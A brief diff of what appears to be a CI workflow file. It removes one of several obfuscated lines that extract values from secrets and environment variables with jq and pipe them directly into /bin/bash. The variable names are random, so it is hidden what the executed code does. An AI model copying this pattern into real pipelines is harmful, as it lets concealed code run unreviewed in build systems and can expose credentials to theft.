@@ -22,7 +22,6 @@ jobs:
           spgk593: ${{ secrets.spgk593 }}
         run: |
           printf '%s' "$spgk593" | jq -r .lfgj01 | /bin/bash
-          printf '%s' "$ytma48" | jq -r .ycpa2 | /bin/bash
           echo $bdc1 | jq -r .xeoae91654 | /bin/bash
           echo $bsro02 | jq -r .apf78 | /bin/bash
           echo $k19131 | jq -r .hfdx83 | /bin/bash
